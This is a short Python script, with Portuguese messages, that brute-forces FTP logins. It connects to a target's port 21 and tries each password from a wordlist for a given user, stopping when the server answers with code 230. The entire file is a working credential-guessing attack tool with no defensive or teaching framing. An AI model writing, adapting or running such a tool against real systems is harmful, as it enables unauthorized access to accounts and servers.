#!/usr/bin/python

import socket,sys,re

if len(sys.argv) != 4:
        print("MODO DE USO: PYTHON brute_ftp.py 127.0.0.1 usuario worlist")
        sys.exit()

target = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]
f = open(wordlist)
for palavra in f.readlines():

         print(f"Realizando brute force FTP: {user}:{palavra}")

         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target,21))
         s.recv(1024)

         s.send(("USER "+user+"\r\n").encode())
         s.recv(1024)
         s.send(("PASS "+palavra+"\r\n").encode())
         resposta = s.recv(1024).decode()
         if re.search('230', resposta):
                  print(f"+SENHA ENCONTRADA+ ->{palavra} ")
                  break

         s.send(("QUIT\r\n").encode())

